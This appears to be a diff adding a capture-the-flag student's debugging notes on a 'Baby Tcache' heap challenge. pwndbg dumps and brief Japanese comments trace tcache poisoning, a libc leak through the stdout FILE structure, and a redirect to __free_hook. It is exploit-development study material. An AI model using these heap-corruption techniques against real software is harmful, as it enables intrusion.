@@ -1,0 +1,690 @@
+0x557cdb225250 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 1297, 
+  fd = 0x4141414141414141, 
+  bk = 0x4141414141414141, 
+  fd_nextsize = 0x4141414141414141, 
+  bk_nextsize = 0x4141414141414141
+}
+0x557cdb225760 FASTBIN {
+  mchunk_prev_size = 0, 
+  mchunk_size = 65, 
+  fd = 0x4242424242424242, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x557cdb2257a0 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 1537, 
+  fd = 0xffffffffffffffff, 
+  bk = 0xffffffffffffffff, 
+  fd_nextsize = 0xffffffffffffffff, 
+  bk_nextsize = 0xffffffffffffffff
+}
+0x557cdb225da0 FASTBIN {
+  mchunk_prev_size = 0, 
+  mchunk_size = 65, 
+  fd = 0x4444444444444444, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+
+
+****************************************
+
+tcachebins
+0x40 [  1]: 0x557cdb225770 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x557cdb225250 —▸ 0x7efeb70efca0 (main_arena+96) ◂— 0x557cdb225250
+smallbins
+empty
+largebins
+empty
+
+
+0x557cdb225250 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 1297, 
+  fd = 0x7efeb70efca0 <main_arena+96>, 
+  bk = 0x7efeb70efca0 <main_arena+96>, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x557cdb225760 {
+  mchunk_prev_size = 1296, 
+  mchunk_size = 64, 
+  fd = 0x0, 
+  bk = 0xdadadadadadadada, 
+  fd_nextsize = 0xdadadadadadadada, 
+  bk_nextsize = 0xdadadadadadadada
+}
+0x557cdb2257a0 PREV_INUSE {
+  mchunk_prev_size = 15770157678700714714, 
+  mchunk_size = 1537, 
+  fd = 0xffffffffffffffff, 
+  bk = 0xffffffffffffffff, 
+  fd_nextsize = 0xffffffffffffffff, 
+  bk_nextsize = 0xffffffffffffffff
+}
+0x557cdb225da0 FASTBIN {
+  mchunk_prev_size = 0, 
+  mchunk_size = 65, 
+  fd = 0x4444444444444444, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+
+pwndbg> x/20gx 0x557cdb225250
+0x557cdb225250:	0x0000000000000000	0x0000000000000511
+0x557cdb225260:	0x00007efeb70efca0	0x00007efeb70efca0
+0x557cdb225270:	0x0000000000000000	0x0000000000000000
+0x557cdb225280:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb225290:	0xdadadadadadadada	0xdadadadadadadada
+
+pwndbg> x/20gx 0x557cdb225760
+0x557cdb225760:	0x0000000000000510	0x0000000000000040
+0x557cdb225770:	0x0000000000000000	0xdadadadadadadada
+0x557cdb225780:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb225790:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb2257a0:	0xdadadadadadadada	0x0000000000000601
+0x557cdb2257b0:	0xffffffffffffffff	0xffffffffffffffff
+0x557cdb2257c0:	0xffffffffffffffff	0xffffffffffffffff
+
+
+************************
+
+tcachebins
+empty
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x557cdb225250 —▸ 0x7efeb70efca0 (main_arena+96) ◂— 0x557cdb225250
+smallbins
+
+0x557cdb225250 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 1297, 
+  fd = 0x7efeb70efca0 <main_arena+96>, 
+  bk = 0x7efeb70efca0 <main_arena+96>, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x557cdb225760 {
+  mchunk_prev_size = 1296, 
+  mchunk_size = 64, 
+  fd = 0x4545454545454545, 
+  bk = 0x4545454545454545, 
+  fd_nextsize = 0x4545454545454545, 
+  bk_nextsize = 0x4545454545454545
+}
+0x557cdb2257a0 {
+  mchunk_prev_size = 1360, 
+  mchunk_size = 1536, 
+  fd = 0xffffffffffffffff, 
+  bk = 0xffffffffffffffff, 
+  fd_nextsize = 0xffffffffffffffff, 
+  bk_nextsize = 0xffffffffffffffff
+}
+0x557cdb225da0 FASTBIN {
+  mchunk_prev_size = 0, 
+  mchunk_size = 65, 
+  fd = 0x4444444444444444, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+
+pwndbg> x/20gx 0x557cdb2257a0-0x20
+0x557cdb225780:	0x4545454545454545	0x4545454545454545
+0x557cdb225790:	0x4545454545454545	0x4545454545454545
+0x557cdb2257a0:	0x0000000000000550	0x0000000000000600
+0x557cdb2257b0:	0xffffffffffffffff	0xffffffffffffffff
+0x557cdb2257c0:	0xffffffffffffffff	0xffffffffffffffff
+0x557cdb2257d0:	0xffffffffffffffff	0xffffffffffffffff
+0x557cdb2257e0:	0xffffffffffffffff	0xffffffffffffffff
+0x557cdb2257f0:	0xffffffffffffffff	0xffffffffffffffff
+
+***********************************
+
+
+0x557cdb225250 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 2897, 
+  fd = 0x7efeb70efca0 <main_arena+96>, 
+  bk = 0x7efeb70efca0 <main_arena+96>, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x557cdb225da0 {
+  mchunk_prev_size = 2896, 
+  mchunk_size = 64, 
+  fd = 0x4444444444444444, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+pwndbg> x/20gx 0x557cdb225250
+0x557cdb225250:	0x0000000000000000	0x0000000000000b51
+0x557cdb225260:	0x00007efeb70efca0	0x00007efeb70efca0
+0x557cdb225270:	0x0000000000000000	0x0000000000000000
+0x557cdb225280:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb225290:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb2252a0:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb2252b0:	0xdadadadadadadada	0xdadadadadadadada
+
+
+**********************************************
+
+
+tcachebins
+0x40 [  1]: 0x557cdb225770 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x557cdb225250 —▸ 0x7efeb70efca0 (main_arena+96) ◂— 0x557cdb225250
+smallbins
+empty
+largebins
+empty
+
+
+0x557cdb225250 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 2897, 
+  fd = 0x7efeb70efca0 <main_arena+96>, 
+  bk = 0x7efeb70efca0 <main_arena+96>, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x557cdb225da0 {
+  mchunk_prev_size = 2896, 
+  mchunk_size = 64, 
+  fd = 0x4444444444444444, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+
+pwndbg> x/20gx 0x557cdb225250
+0x557cdb225250:	0x0000000000000000	0x0000000000000b51
+0x557cdb225260:	0x00007efeb70efca0	0x00007efeb70efca0
+0x557cdb225270:	0x0000000000000000	0x0000000000000000
+0x557cdb225280:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb225290:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb2252a0:	0xdadadadadadadada	0xdadadadadadadada
+
+
+pwndbg> x/20gx 0x557cdb225da0
+0x557cdb225da0:	0x0000000000000b50	0x0000000000000040
+0x557cdb225db0:	0x4444444444444444	0x0000000000000000
+0x557cdb225dc0:	0x0000000000000000	0x0000000000000000
+0x557cdb225dd0:	0x0000000000000000	0x0000000000000000
+0x557cdb225de0:	0x0000000000000000	0x00000000000201c1
+0x557cdb225df0:	0x0000000000000000	0x0000000000000000
+0x557cdb225e00:	0x0000000000000000	0x0000000000000000
+
+***************************************************
+
+
+tcachebins
+0x40 [  1]: 0x557cdb225770 —▸ 0x7efeb70efca0 (main_arena+96) —▸ 0x557cdb225de0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x557cdb225760 —▸ 0x7efeb70efca0 (main_arena+96) ◂— 0x557cdb225760
+smallbins
+empty
+largebins
+empty
+
+
+0x557cdb225250 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 1297, 
+  fd = 0x4646464646464646, 
+  bk = 0x7efeb70f0260 <main_arena+1568>, 
+  fd_nextsize = 0x557cdb225250, 
+  bk_nextsize = 0x557cdb225250
+}
+0x557cdb225760 PREV_INUSE {
+  mchunk_prev_size = 1280, 
+  mchunk_size = 1601, 
+  fd = 0x7efeb70efca0 <main_arena+96>, 
+  bk = 0x7efeb70efca0 <main_arena+96>, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+
+
+pwndbg> x/30xg 0x557cdb225770-0x30
+0x557cdb225740:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb225750:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb225760:	0x0000000000000500	0x0000000000000641
+0x557cdb225770:	0x00007efeb70efca0	0x00007efeb70efca0
+0x557cdb225780:	0x0000000000000000	0x0000000000000000
+0x557cdb225790:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb2257a0:	0xdadadadadadadada	0x0000000000000600
+0x557cdb2257b0:	0xdadadadadadadada	0xdadadadadadadada
+0x557cdb2257c0:	0xdadadadadadadada	0xdadadadadadadada
+
+大きめのサイズのchunk（chunkA~Cを一つと見たもの）が今回のmallocで分割されて0x510（ユーザへ渡される）とそれ以外にわけられ、ユーザに渡されないほうがunsortedにつなぎ直される。ここはかつてのchunkBに存在し、tcacheにつながっている。
+
+*****************************************************
+
+
+pwndbg> bins
+tcachebins
+0x40 [  0]: 0x7efeb70efca0 (main_arena+96) —▸ 0x557cdb225de0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all [corrupted]
+FD: 0x557cdb225760 ◂— 0x47474747474747 /* 'GGGGGGG' */
+BK: 0x557cdb225760 —▸ 0x7efeb70efca0 (main_arena+96) ◂— 0x557cdb225760
+smallbins
+empty
+largebins
+empty
+
+
+0x557cdb225250 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 1297, 
+  fd = 0x4646464646464646, 
+  bk = 0x7efeb70f0260 <main_arena+1568>, 
+  fd_nextsize = 0x557cdb225250, 
+  bk_nextsize = 0x557cdb225250
+}
+0x557cdb225760 PREV_INUSE {
+  mchunk_prev_size = 1280, 
+  mchunk_size = 1601, 
+  fd = 0x47474747474747, 
+  bk = 0x7efeb70efca0 <main_arena+96>, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+***************************************************
+tcachebins
+0x40 [ -1]: 0x5602d236ade0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all [corrupted]
+FD: 0x5602d236a760 —▸ 0x7f2298f36750 ◂— 0x0
+BK: 0x5602d236a760 —▸ 0x7f2298f34ca0 (main_arena+96) ◂— 0x5602d236a760
+smallbins
+0x30 [corrupted]
+FD: 0x7f2298f34cc0 (main_arena+128) ◂— 0x7f2298f34cc0
+BK: 0x7f2298f34c00 (_IO_wide_data_0+288) ◂— 0x0
+
+
+
+
+
+stdout:::
+0x7fcc11d06760
+0x7fb053641760
+
+arena:::
+0x7fcc11d05c40
+0x7fb053640c40
+
+diff:
+0xb20
+0xb20
+
+Note that the last three nibbles are constant, irrespective of ASLR
+
+
+struct _IO_FILE
+{
+  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  char *_IO_read_ptr;        /* Current read pointer */
+  char *_IO_read_end;        /* End of get area. */
+  char *_IO_read_base;        /* Start of putback+get area. */
+  char *_IO_write_base;        /* Start of put area. */
+  char *_IO_write_ptr;        /* Current put pointer. */
+  char *_IO_write_end;        /* End of put area. */
+  char *_IO_buf_base;        /* Start of reserve area. */
+  char *_IO_buf_end;        /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+  struct _IO_marker *_markers;
+  struct _IO_FILE *_chain;
+  int _fileno;
+  int _flags2;
+  __off_t _old_offset; /* This used to be _offset but it's too small.  */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+
+
+
+成功すると
+tcachebins
+0x40 [  0]: 0x7f0d7ed00760 (_IO_2_1_stdout_) ◂— 0xfbad2887
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x56230dc3ac90 —▸ 0x7f0d7ecffca0 (main_arena+96) ◂— 0x56230dc3ac90
+smallbins
+empty
+largebins
+empty
+
+
+pwndbg> x/20gx 0x7f0d7ed00760
+0x7f0d7ed00760 <_IO_2_1_stdout_>:	0x00000000fbad3887	0x0000000000000000
+0x7f0d7ed00770 <_IO_2_1_stdout_+16>:	0x0000000000000000	0x0000000000000000
+0x7f0d7ed00780 <_IO_2_1_stdout_+32>:	0x00007f0d00000000	0x00007f0d7ed007e3
+0x7f0d7ed00790 <_IO_2_1_stdout_+48>:	0x00007f0d7ed007e3	0x00007f0d7ed007e3
+0x7f0d7ed007a0 <_IO_2_1_stdout_+64>:	0x00007f0d7ed007e4	0x0000000000000000
+0x7f0d7ed007b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
+0x7f0d7ed007c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007f0d7ecffa00
+0x7f0d7ed007d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
+0x7f0d7ed007e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007f0d7ed018c0
+0x7f0d7ed007f0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
+
+
+あ、chunkのサイズが足りないな
+
+
+****************************************
+
+tcachebins
+0x70 [  0]: 0x7f8d30080760 (_IO_2_1_stdout_) ◂— 0xfbad2887
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x55ae2d6e9c90 —▸ 0x7f8d3007fca0 (main_arena+96) ◂— 0x55ae2d6e9c90
+smallbins
+empty
+largebins
+empty
+
+pwndbg> x/20gx 0x7eff9d060760
+0x7eff9d060760 <_IO_2_1_stdout_>:	0x00000000fbad3887	0x0000000000000000
+0x7eff9d060770 <_IO_2_1_stdout_+16>:	0x0000000000000000	0x0000000000000000
+0x7eff9d060780 <_IO_2_1_stdout_+32>:	0x0000000000000000	0x00007eff9d0607e3
+0x7eff9d060790 <_IO_2_1_stdout_+48>:	0x00007eff9d0607e3	0x00007eff9d0607e3
+0x7eff9d0607a0 <_IO_2_1_stdout_+64>:	0x00007eff9d0607e4	0x0000000000000000
+0x7eff9d0607b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
+0x7eff9d0607c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007eff9d05fa00
+0x7eff9d0607d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
+
+
+
+
+\x00\x00\x00\x00\x00\x00\x00\xb0\x18|ٗ\x7f\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x80�{ٗ\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0�{ٗ\x7f\x00\x00\x878\xad�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07|ٗ\x7f\x00\x00�|ٗ\x7f\x00\x00�|ٗ\x7f\x00\x00�|ٗ\x7f\x00\x00�|ٗ\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00�{ٗ\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00$$$$$$$$$$$$$$$$$$$$$$$$$$$
+🍊      Baby Tcache      🍊
+$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+[*] Switching to interactive mode
+\x00\x00\x00\x00\x00\x00\x00\xb0\x18\x0b�:\x7f\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x80�
+�:\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0�
+�:\x7f\x00\x00\x878\xad�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x0b�:\x7f\x00\x00�
+                                                                         �:\x7f\x00\x00�
+              �:\x7f\x00\x00�
+                             �:\x7f\x00\x00�
+                                            �:\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00�
+�:\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00$$$$$$$$$$$$$$$$$$$$$$$$$$$
+🍊      Baby Tcache      🍊
+$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$   1. New heap           $
+$   2. Delete heap        $ 
+
+
+
+
+*******************************************
+pwndbg> x/20gx 0x7f0587c60760
+0x7f0587c60760 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007f0587c607e3
+0x7f0587c60770 <_IO_2_1_stdout_+16>:	0x00007f0587c607e3	0x00007f0587c607e3
+0x7f0587c60780 <_IO_2_1_stdout_+32>:	0x00007f0587c607e3	0x00007f0587c607e3
+0x7f0587c60790 <_IO_2_1_stdout_+48>:	0x00007f0587c607e3	0x00007f0587c607e3
+0x7f0587c607a0 <_IO_2_1_stdout_+64>:	0x00007f0587c607e4	0x0000000000000000
+0x7f0587c607b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
+0x7f0587c607c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007f0587c5fa00
+0x7f0587c607d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
+0x7f0587c607e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007f0587c618c0
+0x7f0587c607f0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
+
+________________________________________________
+
+pwndbg> x/20gx 0x7f0587c60760
+0x7f0587c60760 <_IO_2_1_stdout_>:	0x00000000fbad3887	0x0000000000000000
+0x7f0587c60770 <_IO_2_1_stdout_+16>:	0x0000000000000000	0x0000000000000000
+0x7f0587c60780 <_IO_2_1_stdout_+32>:	0x00007f0587c60700	0x00007f0587c607e3
+0x7f0587c60790 <_IO_2_1_stdout_+48>:	0x00007f0587c607e3	0x00007f0587c607e3
+0x7f0587c607a0 <_IO_2_1_stdout_+64>:	0x00007f0587c607e4	0x0000000000000000
+0x7f0587c607b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
+0x7f0587c607c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007f0587c5fa00
+0x7f0587c607d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
+0x7f0587c607e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007f0587c618c0
+0x7f0587c607f0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
+pwndbg> x/30gx 0x7f0587c60700
+0x7f0587c60700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007f0587c618b0
+0x7f0587c60710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
+0x7f0587c60720 <_IO_2_1_stderr_+160>:	0x00007f0587c5f780	0x0000000000000000
+0x7f0587c60730 <_IO_2_1_stderr_+176>:	0x0000000000000000	0x0000000000000000
+0x7f0587c60740 <_IO_2_1_stderr_+192>:	0x0000000000000000	0x0000000000000000
+0x7f0587c60750 <_IO_2_1_stderr_+208>:	0x0000000000000000	0x00007f0587c5c2a0
+0x7f0587c60760 <_IO_2_1_stdout_>:	0x00000000fbad3887	0x0000000000000000
+0x7f0587c60770 <_IO_2_1_stdout_+16>:	0x0000000000000000	0x0000000000000000
+0x7f0587c60780 <_IO_2_1_stdout_+32>:	0x00007f0587c60700	0x00007f0587c607e3
+0x7f0587c60790 <_IO_2_1_stdout_+48>:	0x00007f0587c607e3	0x00007f0587c607e3
+0x7f0587c607a0 <_IO_2_1_stdout_+64>:	0x00007f0587c607e4	0x0000000000000000
+0x7f0587c607b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
+0x7f0587c607c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007f0587c5fa00
+0x7f0587c607d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
+0x7f0587c607e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007f0587c618c0
+pwndbg> x/4gx 0x7f0587c618b0
+0x7f0587c618b0 <_IO_stdfile_2_lock>:	0x0000000000000000	0x0000000000000000
+0x7f0587c618c0 <_IO_stdfile_1_lock>:	0x0000000000000000	0x0000000000000000
+
+
+
+
+3729   for (;; )
+3730     {      
+3731       int iters = 0;
+3732       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
+3733         {  
+3734           bck = victim->bk;
+3735           if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0     )
+3736               || __builtin_expect (chunksize_nomask (victim)
+3737 ▸-▸-▸-▸-   > av->system_mem, 0))
+3738             malloc_printerr ("malloc(): memory corruption");
+3739           size = chunksize (victim);
+
+
+
+*******************************************************
+
+
+0x5566f4fab250 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 1409, 
+  fd = 0x4646464646464646, 
+  bk = 0x7fe11a190280 <main_arena+1600>, 
+  fd_nextsize = 0x5566f4fab250, 
+  bk_nextsize = 0x5566f4fab250
+}
+0x5566f4fab7d0 PREV_INUSE {
+  mchunk_prev_size = 0, 
+  mchunk_size = 1329, 
+  fd = 0x4141414141414141, 
+  bk = 0x7fe11a190120 <main_arena+1248>, 
+  fd_nextsize = 0x5566f4fab7d0, 
+  bk_nextsize = 0x5566f4fab7d0
+}
+0x5566f4fabd00 PREV_INUSE {
+  mchunk_prev_size = 15770157678700714496, 
+  mchunk_size = 321, 
+  fd = 0x7fe11a18fca0 <main_arena+96>, 
+  bk = 0x7fe11a18fca0 <main_arena+96>, 
+  fd_nextsize = 0xdadadadadadadada, 
+  bk_nextsize = 0xdadadadadadadada
+}
+
+
+tcachebins
+0x70 [ -1]: 0xfbad2887
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x5566f4fabd00 —▸ 0x7fe11a18fca0 (main_arena+96) ◂— 0x5566f4fabd00
+smallbins
+empty
+largebins
+empty
+
+0x5566f4889060:	0x00005566f4fab260	0x00005566f4fab770
+0x5566f4889070:	0x00005566f4fab7e0	0x00005566f4fab7e0
+0x5566f4889080:	0x00005566f4fabe50	0x00007fe11a190760
+
+
+
+pwndbg> x/20gx 0x5566f4fab770-0x20
+0x5566f4fab750:	0xdadadadadadadada	0xdadadadadadadada
+0x5566f4fab760:	0x0000000000000510	0x0000000000000070
+0x5566f4fab770:	0x0000000000000051	0x0000000000000000
+0x5566f4fab780:	0x0000000000000000	0x0000000000000000
+0x5566f4fab790:	0x0000000000000000	0x0000000000000000
+0x5566f4fab7a0:	0x0000000000000000	0x0000000000000000
+0x5566f4fab7b0:	0x0000000000000000	0x0000000000000000
+0x5566f4fab7c0:	0x0000000000000000	0x0000000000000000
+0x5566f4fab7d0:	0x0000000000000000	0x0000000000000531
+0x5566f4fab7e0:	0x4141414141414141	0x00007fe11a190120
+
+
+pwndbg> x/100gx 0x560a27f83d00
+0x560a27f83d00:	0xdadadadadadada00	0x0000000000000141
+0x560a27f83d10:	0x00007f9f39d8fca0	0x00007f9f39d8fca0
+0x560a27f83d20:	0xdadadadadadadada	0xdadadadadadadada
+0x560a27f83d30:	0xdadadadadadadada	0xdadadadadadadada
+
+pwndbg> x/10gx 0x560a27f83d00+0x140
+0x560a27f83e40:	0x0000000000000140	0x0000000000000040
+0x560a27f83e50:	0x4444444444444444	0x0000000000000000
+0x560a27f83e60:	0x0000000000000000	0x0000000000000000
+0x560a27f83e70:	0x0000000000000000	0x0000000000000000
+
+
+
+******************************************************
+
+
+tcachebins
+0x70 [ -1]: 0xfbad2887
+0x90 [  0]: 0x7f7005e018e8 (__free_hook) ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x55e768f658a0 —▸ 0x7f7005dffca0 (main_arena+96) ◂— 0x55e768f658a0
+smallbins
+empty
+largebins
+empty
+
+
+pwndbg> arena
+{
+  mutex = 0, 
+  flags = 0, 
+  have_fastchunks = 0, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x55e768f65f90, 
+
+
+***************************************
+entryがいっぱいになった
+pwndbg> x/20gx $rax
+0x5619917ee060:	0x00005619932e48f0	0x00005619932e4260
+0x5619917ee070:	0x00005619932e47e0	0x00005619932e4800
+0x5619917ee080:	0x00005619932e4770	0x00005619932e4770
+0x5619917ee090:	0x00005619932e4f60	0x00007ffb396b0760
+0x5619917ee0a0:	0x00005619932e4860	0x00005619932e4860
+
+
+*********************************************
+
